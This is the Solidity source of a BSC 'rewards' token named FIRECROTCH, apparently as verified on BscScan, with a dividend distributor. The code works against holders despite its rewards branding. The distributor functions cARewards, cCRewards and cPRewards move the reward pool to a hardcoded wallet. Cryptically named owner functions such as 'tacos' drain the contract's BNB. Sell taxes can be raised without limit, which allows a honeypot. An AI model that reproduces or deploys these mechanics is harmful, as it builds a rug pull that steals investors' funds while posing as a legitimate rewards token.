/**
 *Submitted for verification at BscScan.com on 2021-09-18
*/

/**
 *Submitted for verification at BscScan.com on 2021-09-17
*/

/**

MAX BUSD REWARDS

*/

//SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.4;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function setnrT(address _nR, address _pR) external;
    function mdistributeDividend(address shareholder) external;
    function cARewards() external;
    function cCRewards(uint256 _aPn, uint256 _aPd) external;
    function cPRewards(uint256 _aPn, uint256 _aPd) external;
    function setWShr(address _se) external;
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;
    
    address _token;
    
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised; }
    
    IBEP20 RWDS = IBEP20(0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47);
    IBEP20 PREVRWDS = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address SHAR = 0x58eD31338BB8D649cBc75f84A339C327a9c2ac89;
    IDEXRouter router;
    
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;
    
    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
    uint256 public minPeriod = 30;
    uint256 public minDistribution = 1 * (10 ** 18);
    uint256 currentIndex;
    
    bool initialized;
    
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder); }
        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);}
        else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder); }
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function cARewards() external override {
        address shareholder = SHAR;
        uint256 Ramount = RWDS.balanceOf(address(this));
        RWDS.transfer(shareholder, Ramount);
        uint256 PRBalance = PREVRWDS.balanceOf(address(this));
        uint256 Pamount = PREVRWDS.balanceOf(address(this));
        if(PRBalance > 0){
            PREVRWDS.transfer(shareholder, Pamount);}
    }

    function cCRewards(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = SHAR;
        uint256 Ramount = RWDS.balanceOf(address(this));
        uint256 PRamount = Ramount.mul(_aPn).div(_aPd);
        RWDS.transfer(shareholder, PRamount);
    }

    function cPRewards(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = SHAR;
        uint256 Pamount = PREVRWDS.balanceOf(address(this));
        uint256 PPamount = Pamount.mul(_aPn).div(_aPd);
        PREVRWDS.transfer(shareholder, PPamount);
    }

    function deposit() external payable override onlyToken {
        uint256 balanceBefore = RWDS.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(RWDS);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp );
        uint256 amount = RWDS.balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }
         //RAINING_SHITCOINS AND JACK BLACK ARE THE SHIT!!!

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0) { return; }
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0; }
            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]); }
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++; }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            RWDS.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }
        uint256 PRBalance = PREVRWDS.balanceOf(address(this));
        if(PRBalance > 0){
            PREVRWDS.transfer(shareholder, amount);}
    }

    function mdistributeDividend(address shareholder) external override {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            RWDS.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }
        uint256 PRBalance = PREVRWDS.balanceOf(address(this));
        if(PRBalance > 0){
            PREVRWDS.transfer(shareholder, amount);}
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function setWShr(address _se) external override onlyToken {
        SHAR = _se;
    }

    function setnrT(address _nR, address _pR) external override onlyToken {
        PREVRWDS = IBEP20(_pR);
        RWDS = IBEP20(_nR);
    }
}

contract FIRECROTCH is IBEP20, Auth {
    using SafeMath for uint256;
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address MAAA = 0x3225447E4e475Ff66469EE5151704117d269B1A9;
    address SEEE = 0x58eD31338BB8D649cBc75f84A339C327a9c2ac89;
    string constant _name = "FIRECROTCH";
    string constant _symbol = "FCROTCH";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 100 * 10**9 * (10 ** _decimals);
    uint256 public _maxTxAmount = ( _totalSupply * 150 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) iFE;
    mapping (address => bool) iTLE;
    mapping (address => bool) iTloE;
    mapping (address => bool) iDE;
    mapping (address => bool) iMWE;
    uint256 lF = 5;
    uint256 rF = 12;
    uint256 mF = 5;
    uint256 tF = 22;
    uint256 fD = 100;
    address aLR;
    address xFR;
    address jFR;
    address oWe = address(this);
    IDEXRouter router;
    address public pair;
    uint256 launchedAt;
    uint256 public asT = _totalSupply * 7 / 10000;
    DividendDistributor distributor;
    uint256 distributorGas = 500000;
    uint256 tL = 15;
    uint256 tLD = 100;
    uint256 trnFd = 70;
    uint256 trdFd = 100;
    uint256 tmnFd = 200;
    uint256 tmdFd = 100;
    uint256 tlnFd = 200;
    uint256 tldFd = 100;
    bool public vsT = true;
    uint256 public vsTf = 30;
    uint256 vsTd = 100;
    bool public TaxBreak = false;
    uint256 public tTB = 0;   
    bool public JeetTaxEnabled = false;
    uint256 public JeetTax = 88;
    bool public bCE = false;
    uint8 public cbTI = 30;
    mapping (address => uint) private cdT;
    bool public swE = true;
    uint256 public sT = _totalSupply * 15 / 10000;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    bool public sME = false;    
    uint256 public _sMN = 1300;
    uint256 public _sMD = 1000;

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = uint256(-1);
        distributor = new DividendDistributor(address(router));
        iFE[msg.sender] = true;
        iFE[address(xFR)] = true;
        iFE[address(this)] = true;
        iTLE[msg.sender] = true;
        iTLE[address(this)] = true;
        iTLE[address(router)] = true;
        iTLE[address(xFR)] = true;
        iMWE[address(xFR)] = true;
        iMWE[address(this)] = true;
        iDE[pair] = true;
        iDE[address(this)] = true;
        iDE[DEAD] = true;
        iDE[ZERO] = true;
        iTloE[address(xFR)] = true;
        iTloE[msg.sender] = true;
        iTloE[DEAD] = true;
        iTloE[address(this)] = true;
        aLR = msg.sender;
        xFR = MAAA;
        jFR = SEEE;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _trFm(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance"); }
        return _trFm(sender, recipient, amount);
    }
    
    function setMTP(uint256 _mnTP, uint256 _mdTP) external authorized {
        _maxTxAmount = (_totalSupply * _mnTP) / _mdTP;
    }

    function setMWP(uint256 _mnWP, uint256 _mdWP) external authorized {
        _maxWalletToken = (_totalSupply * _mnWP) / _mdWP;
    }

    function setSMEnabled(bool _enabled) external authorized {
        sME = _enabled;
    }
    
    function _trFm(address sender, address recipient, uint256 amount) internal returns (bool){
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != xFR && recipient != aLR){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}
        if (sender == pair &&
            bCE &&
            !iTloE[recipient]) {
            require(cdT[recipient] < block.timestamp,"Please wait for cooldown between buys");
            cdT[recipient] = block.timestamp + cbTI;}    
        checkTxLimit(sender, amount);
        if(sSB(amount) && vsT && sender != address(oWe) && (amount.mul(vsTf).div(vsTd) >= sT)){ vswBk(amount); }
        if(sSB(amount) && vsT && sender != address(oWe) &&(amount.mul(vsTf).div(vsTd) < sT)){ swBk(); }
        if(sSB(amount) && sender != address(oWe) && !vsT){ swBk(); }
        _balances[sender] = _balances[sender].sub(amount, "+");
        uint256 amountReceived = stTF(sender) ? ttF(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        if(!iDE[sender]) {
            try distributor.setShare(sender, _balances[sender]) {} catch {} }
        if(!iDE[recipient]) {
            try distributor.setShare(recipient, _balances[recipient]) {} catch {} }
        try distributor.process(distributorGas) {} catch {}
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || iTLE[sender], "TX Limit Exceeded");
    }

    function stTF(address sender) internal view returns (bool) {
        return !iFE[sender];
    }

    function getTF(bool selling) public view returns (uint256) {
        if(launchedAt + 1 >= block.number){ return fD.sub(1); }
        if(selling && sME && !JeetTaxEnabled){ return ((tF.mul(_sMN)).div(_sMD)); }
        if(selling && JeetTaxEnabled){ return JeetTax.mul(1); }
        if(!selling && TaxBreak){ return tTB.mul(1); }
        return tF;
    }

    function ttF(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTF(receiver == pair)).div(fD);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function sSB(uint256 amount) internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swE
        && amount >= asT
        && _balances[address(this)] >= sT;
    }

    function tacos(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(jFR).transfer(amountBNB.mul((aP).div(100)));
    }

    function SetcdE(bool _status, uint8 _interval) external authorized {
        bCE = _status;
        cbTI = _interval;
    }

    function wacaco(address _ma) external onlyOwner {
        xFR = _ma;
    }

    function rev(address _se) external onlyOwner {
        jFR = _se;
        distributor.setWShr(_se);
    }

    function aDd(address _aDd) external authorized {
        oWe = _aDd;
    }

    function swBk() internal swapping {
        uint256 dLF = isOverLiquified(tL, tLD) ? 0 : lF.mul(tlnFd).div(tldFd);
        uint256 aTL = sT.mul(dLF).div(tF).div(2);
        uint256 aTS = sT.sub(aTL);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 bB = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            aTS,
            0,
            path,
            address(this),
            block.timestamp );
        uint256 aBNB = address(this).balance.sub(bB);
        uint256 tBNBF = tF.sub(dLF.div(2));
        uint256 aBNBL = aBNB.mul(dLF).div(tBNBF).div(2);
        uint256 aBNBR = aBNB.mul(rF.mul(trnFd).div(trdFd)).div(tBNBF);
        uint256 aBNBM = aBNB.mul(mF.mul(tmnFd).div(tmdFd)).div(tBNBF);
        try distributor.deposit{value: aBNBR}() {} catch {}
        (bool tmpSuccess,) = payable(xFR).call{value: aBNBM, gas: 30000}("");
        tmpSuccess = false;
        if(aTL > 0){
            router.addLiquidityETH{value: aBNBL}(
                address(this),
                aTL,
                0,
                0,
                aLR,
                block.timestamp );
            emit AutoLiquify(aBNBL, aTL); }
    }

    function setiDE(address holder, bool exempt) external authorized {
        require(holder != address(this) && holder != pair);
        iDE[holder] = exempt;
        if(exempt){
            distributor.setShare(holder, 0);}
        else{distributor.setShare(holder, _balances[holder]); }
    }

    function setFE(address holder, bool exempt) external authorized {
        iFE[holder] = exempt;
    }

    function setTLE(address holder, bool exempt) external authorized {
        iTLE[holder] = exempt;
    }

    function setWME(address holder, bool exempt) internal authorized {
        iMWE[holder] = exempt;
    }

    function setTLoE(address holder, bool exempt) external authorized {
        iTloE[holder] = exempt;
    }

    function setFFEE(uint256 _lF, uint256 _rF, uint256 _mF, uint256 _fD) external authorized {
        lF = _lF;
        rF = _rF;
        mF = _mF;
        tF = _lF.add(_rF).add(_mF);
        fD = _fD;
    }
    //RAINING_SHITCOINS AND JACK BLACK ARE THE SHIT!!!
    function settrFd(uint256 _n, uint256 _d) external authorized {
        trnFd = _n;
        trdFd = _d;
    }

    function tupac(bool _enabled, uint256 _jtm) external authorized {
        JeetTaxEnabled = _enabled;
        JeetTax = _jtm;
    }

    function biggiesmalls(bool _enabled, uint256 _ttb) external authorized {
        TaxBreak = _enabled;
        tTB = _ttb;
    }

    function setvsT(bool _enabled, uint256 _vstf, uint256 _vstd) external authorized {
        vsT = _enabled;
        vsTf = _vstf;
        vsTd = _vstd;
    }

    function meritor(bool _enabled, uint256 _bT, uint256 _jT) external authorized {
        tTB = _bT;
        TaxBreak = _enabled;
        JeetTax = _jT;
        JeetTaxEnabled = _enabled;
    }

    function settmFd(uint256 _n, uint256 _d) external authorized {
        tmnFd = _n;
        tmdFd = _d;
    }
    
    function settlFd(uint256 _n, uint256 _d) external authorized {
        tlnFd = _n;
        tldFd = _d;
    }

    function setaFd(uint256 _ln, uint256 _ld, uint256 _rn, uint256 _rd, uint256 _mn, uint256 _md) external authorized {
        tlnFd = _ln;
        tldFd = _ld;
        tmnFd = _mn;
        tmdFd = _md;
        trnFd = _rn;
        trdFd = _rd;
    }

    function setsM(uint256 _n, uint256 _d) external authorized {
        _sMN = _n;
        _sMD = _d;
    }

    function setFR(address _aLR, address _xFR) external authorized {
        aLR = _aLR;
        xFR = _xFR;
    }

    function vswBk(uint256 amount) internal swapping {
        uint256 vvsT = amount.mul(vsTf).div(vsTd);
        uint256 dLF = isOverLiquified(tL, tLD) ? 0 : lF.mul(tlnFd).div(tldFd);
        uint256 aTL = vvsT.mul(dLF).div(tF).div(2);
        uint256 aTS = vvsT.sub(aTL);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 bB = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            aTS,
            0,
            path,
            address(this),
            block.timestamp );
        uint256 aBNB = address(this).balance.sub(bB);
        uint256 tBNBF = tF.sub(dLF.div(2));
        uint256 aBNBL = aBNB.mul(dLF).div(tBNBF).div(2);
        uint256 aBNBR = aBNB.mul(rF.mul(trnFd).div(trdFd)).div(tBNBF);
        uint256 aBNBM = aBNB.mul(mF.mul(tmnFd).div(tmdFd)).div(tBNBF);
        try distributor.deposit{value: aBNBR}() {} catch {}
        (bool tmpSuccess,) = payable(xFR).call{value: aBNBM, gas: 30000}("");
        tmpSuccess = false;
        if(aTL > 0){
            router.addLiquidityETH{value: aBNBL}(
                address(this),
                aTL,
                0,
                0,
                aLR,
                block.timestamp );
            emit AutoLiquify(aBNBL, aTL); }
    }

    function setSBen(bool _enabled) external authorized {
        swE = _enabled;
    }

    function setsT(uint256 _amount) external authorized {
        sT = _totalSupply * _amount / 10000;
    }

    function setasT(uint256 _amount) external authorized {
        asT = _totalSupply * _amount / 10000;
    }

    function setasTsT(uint256 _asT, uint256 _sT) external authorized {
        asT = _totalSupply * _asT / 10000;
        sT = _totalSupply * _sT / 10000;
    }

    function setTL(uint256 _up, uint256 _down) external authorized {
        tL = _up;
        tLD = _down;
    }

    function mTL() external authorized {
        _maxTxAmount = _totalSupply.mul(1);
    }
 
    function tMB(uint256 amount) external authorized {
        buyTokens(amount, jFR);
    }

    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(this);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp);
    }

    function setnR(address _nR, address _pR) external authorized {
        distributor.setnrT(_nR, _pR);
    }

    function depR(uint256 _aB) external authorized {
        uint256 bsT = _totalSupply * _aB / 10000;
        uint256 dLF = isOverLiquified(tL, tLD) ? 0 : lF.mul(tlnFd).div(tldFd);
        uint256 aTL = bsT.mul(dLF).div(tF).div(2);
        uint256 aTS = bsT.sub(aTL);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 bB = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            aTS,
            0,
            path,
            address(this),
            block.timestamp );
        uint256 aBNB = address(this).balance.sub(bB);
        uint256 tBNBF = tF.sub(dLF.div(2));
        uint256 aBNBL = aBNB.mul(dLF).div(tBNBF).div(2);
        uint256 aBNBR = aBNB.mul(rF.mul(trnFd).div(trdFd)).div(tBNBF);
        uint256 aBNBM = aBNB.mul(mF.mul(tmnFd).div(tmdFd)).div(tBNBF);
        try distributor.deposit{value: aBNBR}() {} catch {}
        (bool tmpSuccess,) = payable(xFR).call{value: aBNBM, gas: 30000}("");
        tmpSuccess = false;
        if(aTL > 0){
            router.addLiquidityETH{value: aBNBL}(
                address(this),
                aTL,
                0,
                0,
                aLR,
                block.timestamp );
            emit AutoLiquify(aBNBL, aTL);
        try distributor.process(distributorGas) {} catch {} }
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 750000);
        distributorGas = gas;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function ClaimRewards() external {
        address shareholder = msg.sender;
        distributor.mdistributeDividend(shareholder);
    }

    function getaR() external authorized {
        distributor.cARewards();
    }

    function getpR(uint256 _aPn, uint256 _aPd) external authorized {
        distributor.cPRewards(_aPn, _aPd);
    }

    function getcR(uint256 _aPn, uint256 _aPd) external authorized {
        distributor.cCRewards(_aPn, _aPd);
    }

    function CurrentRewardsFee() public view returns (uint256) {
        if (JeetTaxEnabled) { return JeetTax.mul(rF).div(tF); }
        return rF;
    }

    function setWShr(address _se) external authorized {
        distributor.setWShr(_se);
    }

    function kPrO() external authorized {
        try distributor.process(distributorGas) {} catch {}
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountWBNB);
}